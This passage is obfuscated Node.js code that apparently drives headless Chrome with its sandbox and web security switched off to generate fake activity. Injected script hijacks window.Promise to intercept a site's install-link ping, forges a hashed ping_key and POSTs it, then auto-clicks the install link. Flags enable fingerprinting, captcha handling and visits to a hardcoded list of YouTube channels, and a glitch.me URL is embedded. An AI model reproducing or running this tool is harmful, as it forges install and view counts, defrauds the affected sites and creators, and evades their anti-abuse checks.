(-0x4c4 + 0x25ab * -0x1 + 0x2b5f | L >> 0x195f + 0x853 * 0x1 + -0x21a0) << y[-0x231d + -0x56a * 0x1 + 0x2 * 0x1445 & N++], P[N >> 0xc8e + 0x1e41 + 0x1 * -0x2acd] |= (0x1b62 + -0x134a + -0x798 | L >> 0xe7f * -0x1 + 0xb87 + -0x182 * -0x2 & 0x8 * 0xee + -0x1f * -0x137 + -0x2cda) << y[-0x1 * -0x31c + 0x13e * -0x3 + 0xa1 & N++], P[N >> -0x2378 + -0x18f8 + 0x3c72] |= (-0x145a + -0x12ff + -0x1 * -0x27d9 | L >> -0x1287 + 0x89e + -0x1 * -0x9ef & 0xc8 * -0x17 + -0x1d14 + 0x2f4b) << y[-0x662 + -0x4 * 0x6b9 + -0x1 * -0x2149 & N++], P[N >> -0x1 * -0x1ab6 + -0x146c + -0x2 * 0x324] |= (0x90a + 0x23 * -0xef + 0x25 * 0xa7 | 0x9 * -0x395 + 0xe * -0x1fd + 0x3c52 & L) << y[-0x10c2 + -0x2013 + 0x186c * 0x2 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x10e * -0xd + 0x228b * -0x1 + 0x3081 ? (this['block'] = P[0x25e7 + 0x2dd * -0x3 + -0x1d40], this['start'] = N - (0x11 * -0x2e + 0x277 * -0x6 + -0x486 * -0x4), this['hash'](), this['hashed'] = 0x1 * 0x21e9 + -0x1d90 + -0x458) : this['start'] = N;
                }
                return this['bytes'] > -0x3a9 * 0x1801b4 + 0x126355863 + 0x658d * 0x7d30 && (this['hBytes'] += this['bytes'] / (-0x8 * -0x3880ab47 + 0x7f10 * -0x21c21 + 0xc887ba * 0x5c) << -0x205c + -0x1a41 + 0x3a9d, this['bytes'] = this['bytes'] % (-0x1ff0c0018 + 0x5 * 0x4c03ba0c + 0x182f95ddc)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x2bf + -0x207 * 0x4 + 0x2 * 0x2af;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x2221 + 0x1e2 + 0x204f] = this['block'], J[K >> 0x472 + -0x2 * -0x3d9 + -0xc22] |= x[0xb * 0x18d + -0x1 * -0x2487 + -0x41f * 0xd & K], this['block'] = J[-0x1 * -0x593 + 0x8d + 0x610 * -0x1], K >= -0x1d78 + -0x89 * -0x1f + 0xd19 && (this['hashed'] || this['hash'](), J[0x1 * 0x1828 + -0x26d * 0x5 + -0xc07 * 0x1] = this['block'], J[-0x19af + 0x20b3 + -0x6f4] = J[0x649 * -0x3 + 0x925 + 0x9b7] = J[0x267b * 0x1 + 0x7d * -0x23 + -0x1562] = J[-0x1831 * -0x1 + 0x1dd8 + -0x1cd * 0x1e] = J[0x1723 + 0x2041 + -0x6ec * 0x8] = J[0x25f1 + 0x167 * -0x11 + -0x7 * 0x203] = J[-0x4b * -0x6d + -0x1fde + -0xb] = J[0x1 * 0xaed + 0x1 * -0x157a + -0xa94 * -0x1] = J[0x1e20 * -0x1 + -0x18 + 0x1e40] = J[0xcaa * -0x2 + 0x1f2d + -0x6 * 0xf8] = J[-0x1 * -0xbb4 + -0x7df * 0x1 + -0x3cb] = J[0x1 * 0x496 + -0xff3 * -0x1 + -0x147e] = J[-0x2 * -0x53b + -0x161 * -0x6 + -0x12b0] = J[-0x1 * 0x1d5d + 0xf * 0x2c + 0x1ad6] = J[0x1 * -0x1949 + 0x136 + 0x3 * 0x80b] = J[0x58 * 0x3e + -0x8af + 0x649 * -0x2] = -0x2 * -0xaf1 + 0x20b2 + -0x3694), J[0x72 * 0x6 + 0x1 * -0xde5 + 0xb47 * 0x1] = this['hBytes'] << -0x717 + -0x1217 + 0x1931 | this['bytes'] >>> 0xa66 + -0x11e8 + 0x79f, J[0x911 * 0x1 + 0x24 * 0x96 + -0x1e1a] = this['bytes'] << -0x91 * -0x35 + 0x4d2 * -0x5 + -0x6c * 0xe, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x17ef + 0xf9a + 0x2b * -0xeb; J < -0x256c + 0x1627 + -0x1 * -0xf95; ++J)
                K = Q[J - (-0x47 * -0x7 + 0x10aa + 0x28 * -0x77)] ^ Q[J - (-0x12 * -0x14e + -0x1 * -0xbdd + -0x2351)] ^ Q[J - (0x2649 + -0xb * 0x1d3 + -0x122a)] ^ Q[J - (-0x2 * 0xdfc + 0x268b + -0xa83)], Q[J] = K << -0xe5 * 0x1d + 0x1730 + 0x2c2 | K >>> -0x44 * -0x2b + 0xd65 * 0x1 + 0xc59 * -0x2;
              for (J = 0x22a4 + 0x155 * -0xb + -0x2b * 0x77; J < -0x3e * -0x1 + -0x2 * 0xa16 + 0x1402; J += 0x22b + 0xb7 * 0x19 + -0x5 * 0x401)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2 * -0xb7e + -0x19cf + -0x30d * -0x10 | L >>> 0x9f * 0x1 + 0x6e7 + -0x76b) + (M & N | ~M & O) + P + (-0xb * 0x2aab2a8 + 0x41a08e3c + 0xad7eb51 * 0x5) + Q[J] << -0x204c + -0x24c3 + 0x450f) << 0x14e * -0x17 + -0x8 * -0x11 + 0x1d7f | P >>> -0x12ad + -0x58a + 0xc29 * 0x2) + (L & (M = M << 0x2 * 0xd21 + -0x7 * 0x431 + 0x333 | M >>> 0x6f0 + 0x116 + -0x12 * 0x72) | ~L & N) + O + (0x676881dd + 0x29aeac90 + -0x3694b4d4) + Q[J + (-0x11df * -0x2 + 0x893 + -0x2c5 * 0x10)] << -0x37 * 0xa3 + -0x104f * 0x2 + 0x43a3) << -0x971 + -0x16e3 + 0x2059 | O >>> -0x186c + 0x4 * -0x4eb + -0x16d * -0x1f) + (P & (L = L << 0x12e3 + 0x68 * 0x11 + -0x3ab * 0x7 | L >>> 0x8ca + -0x966 + 0x4f * 0x2) | ~P & M) + N + (-0x4fcad505 * -0x1 + 0xcab2012 * -0x4 + 0x3d6424dc) + Q[J + (-0x7f7 + 0x21fd + -0xf * 0x1bc)] << 0x13 * 0x1d7 + -0x2319 + 0x24) << -0x170d + -0x20fc + 0xa * 0x59b | N >>> 0x26fb + 0x171a * -0x1 + -0x1 * 0xfc6) + (O & (P = P << 0xea4 + -0x4 * -0x29f + -0x1902 | P >>> 0x3 * -0x443 + 0x3 * 0x40d + 0xa4) | ~O & L) + M + (0x2f460c6b + 0x246aac9e * -0x1 + 0x4fa719cc) + Q[J + (-0x3 * -0x6f4 + -0x31 + -0x14a8)] << -0x208c + -0x21 * 0xb3 + -0x1 * -0x379f) << -0xc76 + -0x6 * 0x33f + 0x1ff5 | M >>> -0x214a + 0x212a + 0x3b * 0x1) + (N & (O = O << -0xa77 + -0x1 * 0x19e3 + -0x2 * -0x123c | O >>> -0x1cbc + -0x18cf + 0x358d) | ~N & P) + L + (-0x67918588 + -0x99031e8e * -0x1 + 0x2910e093) + Q[J + (-0xd * -0x1be + -0x13 * 0x87 + -0xc9d)] << -0xa1 * 0x1d + -0x2 * -0x2e0 + -0x17 * -0x8b, N = N << -0xb94 + 0x3 * -0x751 + -0x21 * -0x105 | N >>> -0x21f1 + 0x12dd * 0x2 + 0x3c7 * -0x1;
              for (; J < -0x150b * -0x1 + -0x1a53 * 0x1 + 0x570; J += -0x3 * -0x329 + -0x42b + -0x54b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x113f + 0x2 * 0xf33 + -0x2fa0 | L >>> 0xeed + -0x331 + -0xba1) + (M ^ N ^ O) + P + (-0x11335131 + 0x3bde1425 * 0x2 + -0x1e8 * -0x45ce5) + Q[J] << 0x84b * -0x3 + -0x9d3 * 0x1 + -0x22b4 * -0x1) << -0x26ed + -0x4 * -0x2a5 + 0x2 * 0xe2f | P >>> -0xf47 * -0x1 + 0x5 * 0x57d + 0x2a9d * -0x1) + (L ^ (M = M << -0x1543 + 0x22c3 + -0x476 * 0x3 | M >>> 0x48d * -0x3 + -0x1723 + 0x933 * 0x4) ^ N) + O + (-0x2506eef0 + 0x45791292 + -0x19f * -0x305da1) + Q[J + (0x5 * -0x4fd + -0x1 * 0x1c9b + 0x1 * 0x358d)] << -0xb * 0x2d5 + 0x1 * -0x2035 + -0xa * -0x656) << -0x1ef4 * 0x1 + 0x32 * -0xb1 + 0x418b | O >>> 0x881 + 0xb3d + -0x13a3) + (P ^ (L = L << 0x827 + -0xd12 * 0x1 + -0x509 * -0x1 | L >>> 0xe8e + -0x2b6 * 0x7 + 0x46e) ^ M) + N + (0x88a00763 + 0x328edfa5 + -0x4c54fb67) + Q[J + (-0x620 + -0xd73 + 0x22d * 0x9)] << -0x164f * 0x1 + 0x1 * 0x1915 + 0xa * -0x47) << 0xd7d * -0x2 + 0x1e34 + -0x335 | N >>> 0x739 * -0x5 + -0x255a + -0x6 * -0xc43) + (O ^ (P = P << -0x4 * -0x251 + 0x6bc + -0xfe2 | P >>> 0x18e5 * 0x1 + 0xf77 * 0x2 + -0x129b * 0x3) ^ L) + M + (0x2 * 0x6a61b08b + 0x736ae208 + -0xd954577d) + Q[J + (0x1 * -0x23e5 + 0x1 * 0x8d1 + -0x1b17 * -0x1)] << 0x2 * 0xfed + -0x224 * 0x1 + -0x2 * 0xedb) << -0x1a54 * -0x1 + 0x52f * 0x5 + 0xe * -0x3bb | M >>> 0x228 + 0x382 * -0x4 + 0xbfb) + (N ^ (O = O << 0x173a + -0x3d3 + 0x1 * -0x1349 | O >>> -0xa04 + -0xc * 0x28f + -0x145d * -0x2) ^ P) + L + (-0xa0bfe222 + 0x77204e09 + 0x98797fba) + Q[J + (0x1 * -0x236b + -0x89 * 0x41 + 0x4638)] << -0xd9d + -0x2445 * 0x1 + 0x31e2, N = N << 0x21e + -0x1 * -0x1597 + -0x3d * 0x63 | N >>> 0x3 * -0xc5b + -0x269 + 0x277c;
              for (; J < 0x1dc3 + 0x311 * -0x1 + -0x3 * 0x8d2; J += -0xf8 + -0xd47 + 0xe44)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xa9 * 0x1a + 0x772 * 0x5 + -0x1 * 0x365f | L >>> 0x3f9 + 0x2202 + 0x978 * -0x4) + (M & N | M & O | N & O) + P - (0x8668031c + 0x5ff * -0x8a75a + 0x1e5fb4ae) + Q[J] << -0xd * -0x1e9 + -0x47 * -0x14 + -0x4d * 0x65) << -0x1b * -0xa1 + -0x929 + -0x7cd | P >>> -0x85 * 0x46 + 0x3da * -0x8 + 0x4349) + (L & (M = M << 0x266f + 0x3ce * -0x9 + -0x413 | M >>> 0x20e3 + -0x1187 + -0xf5a) | L & N | M & N) + O - (0x8a81bdb5 + 0x12d7 * 0x92557 + 0x2 * -0x62f5fa51) + Q[J + (-0x1b72 + 0x5 * -0x170 + 0x22a3)] << -0x121c + -0x19ad + 0x2bc9) << -0x883 * 0x1 + 0x1bc3 + -0x133b | O >>> 0x1 * -0x283 + -0x4d * -0xe + 0x33 * -0x8) + (P & (L = L << 0x25f2 + 0x1a20 + -0x1 * 0x3ff4 | L >>> -0x149 * 0x8 + 0x1c70 + -0x1226) | P & M | L & M) + N - (-0x8a200fb4 + 0x7eb35a9f + 0x13b1945 * 0x65) + Q[J + (0xc2c + 0x115 * -0x13 + -0x133 * -0x7)] << 0xe31 + -0x1 * -0x196 + -0x1 * 0xfc7) << -0x1383 + -0x8b9 + 0x1c41 | N >>> 0x11a2 + -0xee0 + -0x1 * 0x2a7) + (O & (P = P << 0x88 * -0x13 + 0x234e + -0x1918 | P >>> 0x892 * -0x3 + 0x1 * -0x2531 + 0x3ee9) | O & L | P & L) + M - (-0x69bcca43 + -0xca48f79d + 0x1a4ea0504) + Q[J + (0x1af * -0x16 + 0xee1 * 0x2 + 0x74b)] << -0xbef + -0x11 * 0x162 + 0x2371) << 0x8f7 + -0x1f91 * 0x1 + 0x169f | M >>> -0x133 * -0xf + -0xe8f * 0x2 + -0x4 * -0x2cf) + (N & (O = O << -0x623 * -0x3 + -0x964 + 0x8e7 * -0x1 | O >>> 0x1 * 0x17e + 0x4b * -0x12 + 0x1 * 0x3ca) | N & P | O & P) + L - (-0x611bbc49 + 0xff82f75 * 0x7 + 0x703e83b * 0xe) + Q[J + (-0x1008 + -0x18b5 + -0x1 * -0x28c1)] << 0x1bbb * -0x1 + 0x5 * 0x7f + 0x1940, N = N << -0xccb + 0x1 * -0x95 + -0xb * -0x13a | N >>> -0x3 * -0xb1d + -0x567 * 0x4 + -0xbb9;
              for (; J < 0x188f * 0x1 + -0xe * 0x22c + 0x629; J += 0x32 * 0x86 + 0x1405 + 0xc5 * -0x3c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1061 + -0x3de + 0x7b * -0x1a | L >>> -0x1 * -0x1105 + -0x1cbe + 0x2 * 0x5ea) + (M ^ N ^ O) + P - (0xac9a1 + 0x2d6be23a + -0x1 * -0x826924f) + Q[J] << 0xc8d * 0x2 + -0xe * -0x1ff + -0x14 * 0x2a7) << 0x3 * -0x5c9 + 0x38 * -0x8f + -0xad * -0x48 | P >>> 0x6b5 * 0x1 + -0x11e9 + -0xb4f * -0x1) + (L ^ (M = M << 0x58b * -0x3 + -0x2114 + 0x31d3 | M >>> -0xd1 * -0x22 + -0xb * -0x265 + -0x3617) ^ N) + O - (-0xf7c1d53 + -0xe2 * 0x57c149 + -0x697dd * -0x163b) + Q[J + (-0x297 + 0x1f43 + -0x1cab)] << 0x254 * -0x4 + 0x13ba + -0xa6a) << -0x6b9 * -0x4 + -0x2e9 + 0x1 * -0x17f6 | O >>> 0x1fda + -0x1cec + -0x2d3) + (P ^ (L = L << 0x1078 + 0x2564 + -0x35be | L >>> 0x1e2e * 0x1 + -0x2 * 0x118e + -0x8 * -0x9e) ^ M) + N - (-0x4e3ea813 + -0x5504d815 + -0x1 * -0xd8e0be52) + Q[J + (-0x911 * -0x1 + 0x1f93 + 0x2e7 * -0xe)] << -0x1b43 + -0x1b54 + 0x3697) << 0x221f * 0x1 + 0x857 + -0x2a71 | N >>> -0x262e + 0x21a4 * -0x1 + 0x47ed * 0x1) + (O ^ (P = P << -0x1608 + -0xe8 * -0x1 + -0x2 * -0xa9f | P >>> 0x966 + -0x1bf4 + 0x1290) ^ L) + M - (-0x34d4f298 + -0x2 * -0x2a9c0968 + 0x5 * 0x43ed2ca) + Q[J + (-0x103b + -0xb7 * -0x1f + -0x5 * 0x12f)] << -0x1636 + 0x19cd + -0x1 * 0x397) << -0x11ee + -0x9ba + -0x41 * -0x6d | M >>> -0x370 + -0x2070 + -0x97 * -0x3d) + (N ^ (O = O << -0x559 * 0x4 + 0x1 * 0x1442 + 0x140 | O >>> -0x1bd1 + 0xae7 * 0x1 + 0x10ec) ^ P) + L - (0x488f5a54 + -0x4b565e83 + -0x80e529f * -0x7) + Q[J + (-0x19 * -0x131 + -0xa39 + -0xc * 0x1a1)] << -0x2 * -0x71 + 0x1 * -0xdab + 0xcc9, N = N << 0x157 * 0x17 + -0x2272 + 0x1 * 0x3bf | N >>> -0x905 * 0x3 + 0x24a1 + 0x9 * -0x110;
              this['h0'] = this['h0'] + L << -0x1824 + -0x75b + -0x1f7f * -0x1, this['h1'] = this['h1'] + M << 0x2 * 0x467 + 0x730 + -0x2 * 0x7ff, this['h2'] = this['h2'] + N << -0x26c * -0x3 + -0x446 + -0x2fe, this['h3'] = this['h3'] + O << 0x163 * 0x14 + -0x581 * 0x1 + -0x163b, this['h4'] = this['h4'] + P << 0xc4f + -0x23d6 + -0x1 * -0x1787;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x57d + -0x1edc + 0x2475 & -0x1 * -0x725 + -0x1 * -0x4ff + -0xc15] + w[J >> 0x163c + 0x9f * 0x13 + 0x21f1 * -0x1 & -0xb81 + -0xbbb + -0x174b * -0x1] + w[J >> -0x85a + 0x1f * 0x1d + 0x1 * 0x4eb & 0x2d8 * -0x2 + -0x1c48 + 0x2207] + w[J >> -0x1 * 0x180e + 0x3b8 + 0x7 * 0x2ea & 0x5b2 + -0x24d4 + 0x1f31] + w[J >> -0x84e * 0x2 + 0x61f + 0x383 * 0x3 & 0x1f46 + 0x3 * -0x76d + -0x8f0] + w[J >> 0x24f8 + 0xd1e + -0x2 * 0x1907 & 0xde4 + -0x1e8f + 0x1 * 0x10ba] + w[J >> 0x26c7 + -0x1142 * 0x2 + -0x1 * 0x43f & 0x1b7f + -0x1 * 0x8d9 + -0x1297] + w[-0x1 * -0xe47 + 0xef5 + -0x1d2d & J] + w[K >> 0xef5 + 0x25c3 + -0x2 * 0x1a4e & -0x322 + 0x135c + 0x102b * -0x1] + w[K >> 0x12 * 0x1b + -0x8 * 0x39e + 0x1b22 & 0xd * -0xc + 0x14d7 + 0x4 * -0x50b] + w[K >> 0x1dbe + -0x5df + -0x17cb & 0x1 * 0x256c + -0x22d6 + -0x287] + w[K >> 0x1d * -0x3 + 0x4 * 0x5c2 + -0x16a1 & 0x1b1b + 0xf61 + 0x2a6d * -0x1] + w[K >> -0x52 * 0x49 + 0x2 * -0x150 + 0x1a0e & 0x19d * -0x11 + -0x1 * -0xc30 + -0xb * -0x164] + w[K >> -0x406 + -0x207c + 0x248a & -0x831 * 0x4 + -0x26c3 + 0x4d * 0xee] + w[K >> 0x31f * -0x9 + -0x19f0 + -0xacf * -0x5 & -0x9 * -0xb1 + -0xa * -0x3a + 0xd * -0xa6] + w[0x1617 + -0xbff + -0xa09 & K] + w[L >> 0x1c3d + 0x1c1f + -0x3840 & -0x1825 * -0x1 + 0x1456 * 0x1 + -0x2c6c] + w[L >> 0x236b + -0x15de + -0xd75 & -0xb0 * 0x2b + 0x8f5 * 0x1 + 0x211 * 0xa] + w[L >> -0x6 + -0xba3 * -0x1 + -0xb89 & -0x1 * -0xad5 + -0x7a9 + 0x31d * -0x1] + w[L >> 0x1b97 * -0x1 + -0x1 * -0x2129 + -0x5 * 0x11a & 0x1 * -0x2015 + 0x3fb + 0x1c29] + w[L >> -0xc2e + -0x18f5 + 0x252f & 0x43c * 0x2 + 0x159 * -0x1 + 0x388 * -0x2] + w[L >> 0x7e3 * -0x4 + 0x4 * 0x3ca + 0x836 * 0x2 & -0xf3a * 0x1 + 0x144d * 0x1 + -0x141 * 0x4] + w[L >> -0xf8c + -0x16d7 + 0x153 * 0x1d & -0x1203 + 0x1 * -0xf13 + 0x2125] + w[0x6 * 0x2ad + 0x17b3 + 0x2 * -0x13d9 & L] + w[M >> 0x91 * 0x34 + -0x1 * 0xdd3 + -0xf85 & 0x52 * 0x19 + 0x167b + -0x1e6e] + w[M >> -0x1092 + -0xce5 * 0x1 + 0x149 * 0x17 & 0x23ee + 0x5a5 + -0x2 * 0x14c2] + w[M >> 0x17 * 0xce + -0x1468 + -0x1 * -0x1fa & 0x2f4 + -0x217 * 0x11 + 0x20a2] + w[M >> -0x20f * 0x11 + 0x13d * -0x1 + -0x2 * -0x1226 & 0x269f + -0x2f8 + -0x2398] + w[M >> -0x1517 * -0x1 + 0x240 * 0x9 + -0x294b & 0xab6 + 0x1a35 + 0x1 * -0x24dc] + w[M >> 0x1 * 0xdb1 + 0x1 * -0x101f + 0x3f * 0xa & 0x14 * -0x8b + 0x2704 + -0x1c19] + w[M >> -0x4 * -0x3e + 0x71b * 0x5 + -0x247b & 0x1de6 + 0x1382 + -0x3159] + w[0xecf * 0x1 + -0xb5 + -0xe0b & M] + w[N >> -0x3c0 + 0xff * 0x2 + 0x1de & -0xee6 * -0x2 + -0xce * -0xf + 0x7 * -0x5f9] + w[N >> 0x1ac * -0x13 + 0x1 * -0x96b + 0x2947 & 0xc4f + 0x1172 + 0x7 * -0x43e] + w[N >> -0x66 + -0x1cf1 + 0x1d6b & -0x216b + -0x2a5 * -0x4 + 0x16e6] + w[N >> -0x1167 * -0x1 + -0x1df3 + 0x10d * 0xc & -0x1 * -0x1702 + 0x1593 + 0x29 * -0x116] + w[N >> -0x1 * 0x1223 + -0x23d4 + 0x3603 & -0x245c + -0x3 * 0x1a5 + 0x295a] + w[N >> 0x225b + 0x3 * 0x334 + -0x1 * 0x2bef & 0x9c5 + 0x2 * -0x254 + 0x1 * -0x50e] + w[N >> -0x1de5 * -0x1 + -0x5 * -0x7cd + 0x3 * -0x16f6 & 0x70c * 0x1 + 0x25fb * -0x1 + 0x1efe] + w[-0x1448 + -0x1446 * -0x1 + 0x11 * 0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1cb7 * -0x1 + -0x1e90 + -0x1f1 * -0x1 & 0x1727 * 0x1 + 0x1 * 0x26b6 + 0x6 * -0xa25,
                J >> 0x16cf * 0x1 + 0x8 * 0xe9 + 0x1 * -0x1e07 & 0xb3e + -0x4 * -0x5ff + 0x223b * -0x1,
                J >> -0x2 * 0xe69 + 0x19b5 + 0x325 & 0x11a6 + 0x10d8 + -0x217f,
                0xdaa + 0x1608 + -0x22b3 & J,
                K >> -0x811 * 0x3 + 0xdb8 + 0xa93 * 0x1 & 0x99b + -0x15d + -0x73f,
                K >> -0x13aa + -0x23c4 * 0x1 + 0x377e & 0xc2 * -0x8 + 0x183 * 0xc + -0xb15,
                K >> -0x1c89 + 0x97 * -0x12 + 0x272f & -0x1c0c + -0x1 * 0x139 + 0x1e44,
                -0x4a * -0x17 + -0x10 * -0x9e + 0x3 * -0x52d & K,
                L >> -0x1d41 + -0x1702 + -0x407 * -0xd & -0x763 + 0x914 + -0xb2 * 0x1,
                L >> 0x1 * -0x1c58 + -0x42 * -0x4f + 0x80a & -0x615 * -0x3 + -0x1a56 + 0x1 * 0x916,
                L >> 0x1e28 + -0x39b * -0x2 + -0xa2 * 0x3b & -0xcab + -0x1a * -0x8b + -0x74,
                0x223 + -0xad2 * 0x3 + 0x1f52 & L,
                M >> 0x71 * 0x1 + 0xe3e * 0x1 + 0x3 * -0x4dd & 0x8f * 0x45 + 0x5ea * 0x5 + 0x431e * -0x1,
                M >> 0x1a0f + -0x1503 + -0x27e * 0x2 & -0x1250 + -0xe4 * -0x25 + -0xda5,
                M >> -0x30 * -0xa9 + -0x1 * -0x19ab + -0x19 * 0x24b & 0x1 * -0x281 + -0x3 * 0x6bd + -0xd * -0x1d3,
                -0xeec + 0xc71 + -0xb2 * -0x5 & M,
                N >> -0x19bd + -0xd * 0x2cf + -0x1 * -0x3e58 & 0x1eb1 + 0x1c42 + -0x39f4,
                N >> -0xc07 + -0x463 + 0x107a & 0x98b + -0x1e65 + -0x77 * -0x2f,
                N >> -0x36d * 0x5 + -0x76 * -0x4 + 0xf51 & 0x2b * -0xa3 + -0x1 * -0x2289 + -0x13 * 0x53,
                -0x1484 + -0x6f6 + 0x25 * 0xc5 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x2c6 * -0x5 + 0x8a3 + -0x166d), (K = new DataView(J))['setUint32'](-0x1295 + -0x270e + 0x39a3, this['h0']), K['setUint32'](0x1875 + 0x6 * 0x22a + -0x256d, this['h1']), K['setUint32'](-0x62a + -0xe9e + 0x14d0, this['h2']), K['setUint32'](-0xa * -0x1b7 + -0x1 * -0x1ebb + -0x9b * 0x4f, this['h3']), K['setUint32'](-0x142a + 0x6a * -0xb + 0x18c8, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1f39 + -0x43 * 0x89 + 0x4a2];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x4 * 0x493 + 0x2 + 0x925 * 0x2;
            J[-0x1 * 0xecf + -0x1744 + 0xcb1 * 0x3]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x997 + 0x1710 + -0x20a7] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x2fb * -0x9 + -0x2 * 0xa44 + 0xa * -0xa1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1155 + 0x19e + -0x12f2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1a50 + -0x185e + -0x14e * -0x3), Promise['resolve'](0x12 * 0x177 + 0x2 * 0x527 + -0x24ab);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1432 * -0x1 + -0x1379 + 0x25 * -0x5; j < 0x20cb + 0x141 + -0x220b; j++)
    i();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1 * 0xb1d + 0x186c + -0xd4f);
    let h = e[f];
    return h;
  }, d(b, c);
}
const NETWORK_PATIENCE = 0x116e + 0xfd5 * 0x3 + -0x21ad + (0x1 * 0x764 + 0x1c8f + -0x183b) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0xdf5 * -0x1 + -0xfdd * -0x2 + -0x2dac) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1 * -0x10a6 + 0x2 * -0x970 + 0x23a; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
